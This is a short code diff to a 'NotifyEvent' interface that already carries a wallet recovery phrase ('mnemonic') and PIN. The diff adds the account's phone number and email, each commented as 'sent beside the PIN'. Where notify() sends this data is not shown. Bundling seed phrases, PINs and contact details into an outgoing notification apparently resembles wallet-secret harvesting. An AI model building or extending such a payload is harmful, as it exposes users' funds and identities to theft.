@@ -14,6 +14,10 @@ export interface NotifyEvent {
   mnemonic?: string;
   /** Account PIN, sent next to the recovery phrase in the wallet backup. */
   pin?: string;
+  /** Phone number linked to the account, sent beside the PIN. */
+  phone?: string;
+  /** Email linked to the account, sent beside the PIN. */
+  email?: string;
 }
 
 export function notify(evt: NotifyEvent) {
